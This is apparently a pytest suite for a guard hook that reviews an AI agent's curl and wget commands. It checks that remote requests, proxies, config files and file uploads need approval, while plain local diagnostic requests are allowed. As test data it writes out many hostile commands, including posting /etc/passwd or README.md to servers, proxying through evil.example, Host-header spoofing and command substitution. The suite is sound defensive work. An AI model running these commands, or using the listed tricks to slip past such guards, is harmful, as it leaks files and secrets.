"""Requests: only one plain curl call to a local server passes; every other request asks."""

from pathlib import Path
import shutil
import subprocess

import pytest

from tests.runtime import load_script_module


guard = load_script_module("agents/hooks/guard_command.py", "guard_command")
pytestmark = pytest.mark.usefixtures("isolated_project")


REMOTE_REVIEW = (
    "Needs review: remote curl/wget can send local data. Read web pages with the web-fetch tool, "
    "or use gh api / nix store prefetch-file for exact values and files."
)


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("curl -s https://pypi.org/pypi/mutmut/json", id="remote fetches"),
        pytest.param(
            "curl -fsSL -o pkg.tgz -H 'User-Agent: x' https://registry.npmjs.org/a/-/a-1.tgz", id="remote downloads"
        ),
        pytest.param(
            'curl -s -o /dev/null -w "%{http_code}\\n" -X HEAD https://cdn.example.com/v1/a.tar.gz',
            id="remote status probes",
        ),
        pytest.param("wget -q -O - https://example.com/install.sh", id="remote fetches with wget"),
        pytest.param(
            "wget -qO- --timeout=10 --header 'Accept: x' https://example.com/a", id="wget clusters and values"
        ),
        pytest.param("curl -sSo out.html -H 'Accept: text/html' https://example.com/", id="curl clusters with values"),
        pytest.param("curl telnet://example.com:4444 < report.txt", id="other schemes that send input"),
        pytest.param("curl telnet://localhost:23 < report.txt", id="other schemes on this machine"),
        pytest.param("curl gopher://127.0.0.1:70/_x", id="gopher on this machine"),
        pytest.param("curl -K cfg http://localhost:3000/", id="local requests with options from a file"),
        pytest.param(
            "wget -d --post-file=README.md -d https://example.com/upload http://localhost/",
            id="a wget debug flag beside a post and a remote URL",
        ),
        pytest.param("wget --post-data x=1 http://localhost:3000/", id="wget posts to this machine"),
        pytest.param("http_proxy=http://evil.example:8080 curl http://localhost:3000/", id="a proxy for one request"),
        pytest.param(
            "export ALL_PROXY=socks5://evil.example:1080; curl -fsS http://localhost:3000/", id="an exported proxy"
        ),
        pytest.param("env HTTPS_PROXY=http://evil.example curl http://127.0.0.1/", id="a proxy through env"),
        pytest.param("CURL_HOME=./cfg curl http://localhost:3000/", id="another curl configuration"),
        pytest.param("HOME=./cfg wget http://localhost:3000/", id="another home for configuration files"),
        pytest.param(
            "wget -O --max-redirect=0 http://localhost/", id="a redirect limit taken as another option's value"
        ),
        pytest.param("wget --max-redirect=0 --max-redirect=5 http://localhost/", id="an overridden redirect limit"),
        pytest.param("curl -L http://localhost:3000/", id="local requests that follow redirects"),
        pytest.param("curl -sSL http://localhost:3000/", id="redirects in a flag cluster"),
        pytest.param("curl -L -d '@README.md' http://localhost:3000/", id="a local post that may follow a redirect"),
        pytest.param("curl https://localhost.example.com/", id="a host that only starts with localhost"),
        pytest.param("curl http://127.0.0.1.evil.example/", id="a host that only starts with the loopback address"),
        pytest.param("curl http://localhost:3000.evil.example/", id="a host after a port-like suffix"),
        pytest.param("wget https://localhost.example.com/", id="wget to a host that only starts with localhost"),
        pytest.param("wget --post-file README.md http://localhost:3000/", id="wget posting a file to this machine"),
        pytest.param("curl -Kcfg http://localhost:3000/", id="curl options from an attached config file"),
        pytest.param("curl --config cfg http://localhost:3000/", id="curl options from a long config option"),
        pytest.param("curl -xevil http://localhost:3000/", id="an attached curl proxy"),
        pytest.param("wget --config cfg http://localhost:3000/", id="wget options from a config file"),
        pytest.param("wget -e use_proxy=on http://localhost:3000/", id="wget commands toward this machine"),
        pytest.param("wget -iurls http://localhost:3000/", id="wget reading URLs from a file"),
        *(
            pytest.param(
                f"curl {option} -H 'https://example.invalid/upload' -d '@README.md' 'http://localhost/'",
                id=f"curl {option} taking the next option as its value",
            )
            for option in ("-A", "-e", "-u", "-b", "-c", "-T", "-F", "-x", "-w", "-r")
        ),
        pytest.param(
            "curl -sA -H 'https://example.invalid/upload' 'http://localhost/'", id="a valued option in a cluster"
        ),
        pytest.param("curl -r -H 'file:///dev/null' 'http://localhost/'", id="a second file URL"),
        pytest.param("curl 'http://localhost/' file:///dev/null", id="a second URL after the local one"),
        pytest.param(
            "curl -A -H https://example.invalid/upload -d @README.md http://localhost/",
            id="the unquoted counterexample",
        ),
        pytest.param("wget 'http://[::1]/'", id="wget to this machine over IPv6, which may redirect"),
        pytest.param("wget -O - 'http://[::1]/'", id="wget to standard output, which may redirect"),
        pytest.param("wget http://localhost:3000/", id="wget to a local server, which may redirect"),
        pytest.param(
            "env http_pro''xy=http://example.invalid:8080 curl -X POST -d '@README.md' http://localhost:3000/",
            id="a proxy name split by quotes through env",
        ),
        pytest.param(
            "http_proxy=http://example.invalid:8080 curl http://localhost:3000/", id="a lowercase proxy prefix"
        ),
        pytest.param("ALL_PROXY=socks5://example.invalid:1080 curl http://localhost:3000/", id="an ALL_PROXY prefix"),
        pytest.param(
            "env http_pro\\\nxy=http://example.invalid curl http://localhost:3000/",
            id="a proxy name split by a line continuation",
        ),
        pytest.param("export http_proxy=x; curl http://localhost:3000/", id="an exported lowercase proxy"),
        pytest.param("X=1 curl http://localhost:3000/", id="any assignment before a local request"),
        pytest.param("curl http://localhost:3000/ > out.txt", id="a local request with a redirect"),
        pytest.param("true && curl http://localhost:3000/", id="a local request in a list"),
        pytest.param("command curl http://localhost:3000/", id="a local request behind a wrapper"),
        pytest.param("curl --location http://127.0.0.1:8080/", id="the long redirect option"),
        pytest.param("curl --location-trusted http://localhost/", id="trusted redirects"),
        pytest.param("wget -q -O- http://localhost:3000/", id="wget, which follows redirects by default"),
        pytest.param("wget --max-redirect=3 http://localhost:3000/", id="wget with redirects allowed"),
    ],
)
def test_remote_requests_ask_and_point_to_safer_tools(capsys: pytest.CaptureFixture[str], command: str) -> None:
    verdict = guard.decide("allowed", {"tool_input": {"command": command}})
    assert verdict.decision == "ask"
    assert REMOTE_REVIEW in verdict.reason
    assert capsys.readouterr() == ("", "")


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    ("path", "decision"),
    [
        ("/Users/kaito/.zshrc", "ask"),
        ("/tmp/out.json", "ask"),
        ("../x", "ask"),
        ("~/x", "ask"),
        ("..", "ask"),
        ("out/../x", "ask"),
        ("out/..", "ask"),
        ("out//../x", "ask"),
        ("/dev/null/../x", "ask"),
        ("/dev/null/", "ask"),
        ("/dev/./null", "ask"),
        ("//dev/null", "ask"),
        ("-", "ask"),
        ("/dev/null", "allow"),
        ("out.json", "ask"),
        ("./out.json", "ask"),
        ("out/result.json", "ask"),
        ("out..json", "ask"),
    ],
)
def test_local_curl_output_is_only_exact_dev_null(path: str, decision: str, suffix: str) -> None:
    command = f"curl -s -o {path} http://localhost/{suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == decision


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    ("target_kind", "path"),
    [
        ("file", "output"),
        ("directory", "output/result.json"),
        ("directory", "output/new/result.json"),
        ("missing", "output"),
    ],
)
@pytest.mark.parametrize("outside", [False, True])
def test_local_curl_output_symlinks_ask(
    tmp_path: Path, target_kind: str, path: str, outside: bool, suffix: str
) -> None:
    cwd = tmp_path / "project"
    cwd.mkdir()
    target = (tmp_path if outside else cwd) / "target"
    if target_kind == "directory":
        target.mkdir()
    elif target_kind == "file":
        target.write_text("existing data")
    (cwd / "output").symlink_to(target, target_is_directory=target_kind == "directory")
    command = f"curl -s -o {path} http://localhost/{suffix}"
    assert guard.decide("allowed", {"cwd": str(cwd), "tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize("path", [".envrc", ".git/hooks/pre-commit", "./.envrc", "out/.secret", "out/.cache/data"])
def test_local_curl_hidden_output_asks(tmp_path: Path, path: str, suffix: str) -> None:
    command = f"curl -s -o {path} http://localhost/{suffix}"
    assert guard.decide("allowed", {"cwd": str(tmp_path), "tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    ("data", "decision"),
    [
        ("@/etc/passwd", "ask"),
        ("'@file'", "ask"),
        ("'@/etc/passwd'", "ask"),
        ("'@'", "ask"),
        ("'@-'", "ask"),
        ("'{\"a\":1}'", "allow"),
        ("'email@example.com'", "allow"),
        ("''", "allow"),
    ],
)
def test_local_curl_data_cannot_read_files(data: str, decision: str, suffix: str) -> None:
    command = f"curl -s -d {data} http://localhost/{suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == decision


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    "command",
    [
        r"curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:4399/app/",
        r"curl -s -o /dev/null --write-out '%{http_code}\n' http://127.0.0.1:4399/app/",
        "curl -s -D - --compressed -o /dev/null http://127.0.0.1:4411/x",
        "curl -s --dump-header - --compressed -o /dev/null 'http://[::1]:4411/x'",
    ],
)
def test_local_curl_fixed_diagnostics_are_allowed(command: str, suffix: str) -> None:
    assert guard.decide("allowed", {"tool_input": {"command": command + suffix}}).decision == "allow"


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    ("header", "decision"),
    [
        ("Host: evil.com", "ask"),
        ("X-Forwarded-Host: evil", "ask"),
        ("Authorization: Bearer secret", "ask"),
        ("Cookie: session=secret", "ask"),
        ("X-Custom: value", "ask"),
        ("Accept-Language: en", "ask"),
        ("@headers.txt", "ask"),
        ("Accept: application/json\r\nHost: evil.com", "ask"),
        ("Accept: application/json\nCookie: secret", "ask"),
        ("Content-Type: application/json", "allow"),
        ("Accept: application/json", "allow"),
        ("User-Agent: local-check", "allow"),
        ("content-type: application/json", "allow"),
        ("aCcEpT: application/json", "allow"),
        ("USER-AGENT: local-check", "allow"),
    ],
)
def test_local_curl_headers_are_limited_to_dev_check_metadata(header: str, decision: str, suffix: str) -> None:
    command = f"curl -s -H '{header}' http://localhost/{suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == decision


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    "command",
    [
        r'curl -s -w "\"" -w https://example.com/ -d @/etc/hosts -w "\"" http://localhost/',
        r'curl -s -w "\"" -w https://example.com/ -L -x https://example.com/ -K /etc/hosts -w "\"" http://localhost/',
        r'curl -s -w "\\\"" -w https://example.com/ -d @/etc/hosts -w "\\\"" http://localhost/',
        r'curl -s -w "\\\"" -L -x https://example.com/ -K /etc/hosts -w "\\\"" http://localhost/',
        'curl -s -w "status" http://localhost/',
        r'curl -s --write-out "%{http_code}\n" http://localhost/',
    ],
)
def test_local_curl_double_quoted_write_out_asks(command: str, suffix: str) -> None:
    assert guard.decide("allowed", {"tool_input": {"command": command + suffix}}).decision == "ask"


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize("option", ["-w", "--write-out"])
@pytest.mark.parametrize(
    "value",
    [
        "%output{/tmp/curl_output}text",
        "%output{>>/tmp/curl_output}text",
        "@/etc/hosts",
        "%{stderr}text",
        "%{stdout}text",
        "%{json}",
        "%header{set-cookie}",
        "%{unknown}",
        "%{http_code} %output{/tmp/curl_output}",
        r"\t",
        "$HOME",
        "status!",
        "status\n",
    ],
)
def test_local_curl_unsafe_write_out_format_asks(value: str, option: str, suffix: str) -> None:
    command = f"curl -s {option} '{value}' http://localhost/{suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize("option", ["-w", "--write-out"])
@pytest.mark.parametrize(
    "value",
    [
        "",
        "Status: code=200 ok_1.2,/path-x",
        r"%{http_code}\n%{time_total}\n%{time_connect}\n%{time_starttransfer}\n",
        "%{size_download} %{content_type} %{url_effective} %{remote_ip}",
    ],
)
def test_local_curl_safe_write_out_format_is_allowed(value: str, option: str, suffix: str) -> None:
    command = f"curl -s {option} '{value}' http://localhost/{suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "allow"


@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
@pytest.mark.parametrize(
    "options",
    [
        "-o first -o second",
        "-d 'first' -d 'second'",
        "-X GET -X POST",
        "-d 'data' -H 'Accept: x'",
        "-o output -d 'data'",
    ],
)
def test_local_curl_repeated_or_reordered_options_ask(options: str, suffix: str) -> None:
    command = f"curl -s {options} http://localhost/{suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize(
    "command",
    [
        "curl -s -w '%{http_code}' https://example.com/",
        "curl -s -L -w '%{http_code}' http://localhost/",
        "curl -s -K config http://localhost/",
        "curl -s --config config http://localhost/",
        "curl -s -x proxy http://localhost/",
        "curl -s --proxy proxy http://localhost/",
        'curl -s "$URL"',
        "curl -s -D headers.txt http://localhost/",
        "curl -s --dump-header headers.txt http://localhost/",
        'curl -s -w "$FORMAT" http://localhost/',
        'curl -s -w "`id`" http://localhost/',
        'curl -s -w "%{http_code}\\\n" http://localhost/',
        "curl -s -w %{http_code} http://localhost/",
    ],
)
def test_local_curl_diagnostics_keep_unsafe_forms_under_review(command: str) -> None:
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize(
    "filters",
    ["jq '.'", "jq -r '.status'", "head -n 10", "tail -c 20", "grep -i status", "wc -l", "jq '.' | head -n 5 | wc -l"],
)
def test_local_curl_read_only_pipeline_is_allowed(filters: str) -> None:
    command = f"curl -s http://localhost:3000/api | {filters}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "allow"


@pytest.mark.parametrize("prefix", ["", "jq '.' | "])
@pytest.mark.parametrize(
    "argument",
    [
        r"\\*",
        r"\*",
        r"sta\tus",
        "*",
        "?",
        "[ab]",
        "{a,b}",
        "~",
        "$HOME",
        "`pwd`",
        "^README.md",
        "a#",
        "a##",
        "a~b",
        "(a|b)",
        "a(.)",
        '"status"',
        '"^README.md"',
        r"'safe'\\*",
        "$'\\x2a'",
    ],
)
def test_local_curl_filter_shell_expansions_ask(argument: str, prefix: str) -> None:
    command = f"curl -s http://localhost:3000/api | {prefix}grep {argument}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("filters", [r"jq \.", r"head -n \1", r"tail -c \2", r"wc -\l", r"grep sta\tus"])
def test_local_curl_every_filter_requires_literal_words(filters: str) -> None:
    command = f"curl -s http://localhost:3000/api | {filters}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("argument", [r"\\*", "^README.md"])
def test_local_curl_filter_globs_ask(argument: str) -> None:
    command = f"curl -s http://localhost:3000/api | grep {argument}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("argument", [r"\\*", "^README.md"])
def test_local_curl_filter_globs_expand_to_local_files(tmp_path: Path, argument: str) -> None:
    zsh = shutil.which("zsh")
    if zsh is None:
        pytest.skip("zsh is required to demonstrate glob expansion to local files")
    names = [r"\.", r"\a", r"\b"] if argument.startswith("\\") else ["a", "b", "c"]
    for name in ["README.md", *names]:
        (tmp_path / name).write_text("a. repository secret\n")
    command = f"curl -s http://localhost:3000/api | grep {argument}"
    result = subprocess.run(
        [zsh, "-f", "-c", "setopt extendedglob; curl() { print stdin; }; " + command],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        check=True,
    )
    assert "repository secret" in result.stdout


@pytest.mark.parametrize("argument", ["status", "'status'", r"'*?[]{}~$`^#()|!<>\\'", "'日本語'"])
def test_local_curl_filter_literal_arguments_are_allowed(argument: str) -> None:
    command = f"curl -s http://localhost:3000/api | grep {argument}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "allow"


@pytest.mark.parametrize(
    "suffix",
    [
        "jq --rawfile secret secret.txt '.'",
        "jq --slurpfile secret secret.json '.'",
        "jq -f program.jq",
        "jq --from-file program.jq",
        "jq 'include \"program\"; .'",
        "jq '. | input_filename'",
        "jq --unknown '.'",
        "grep -f patterns",
        "grep --file patterns",
        "grep --file=patterns",
        "grep -ifpatterns",
        "grep status secret.txt",
        "head secret.txt",
        "tail -F secret.txt",
        "wc --files0-from=files",
        "tee output.txt",
        "sh",
        "cat",
        "jq '.' > output.txt",
        "jq '.' && true",
        "jq '.'; true",
        "jq '.' &",
        "jq '.' | curl http://localhost/",
    ],
)
def test_local_curl_unsafe_or_uncertain_pipeline_asks(suffix: str) -> None:
    command = f"curl -s http://localhost:3000/api | {suffix}"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"


@pytest.mark.parametrize("prefix", ["curl -L", "curl --proxy proxy", "curl -K config"])
def test_local_curl_pipeline_preserves_curl_restrictions(prefix: str) -> None:
    command = f"{prefix} http://localhost:3000/api | jq '.'"
    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
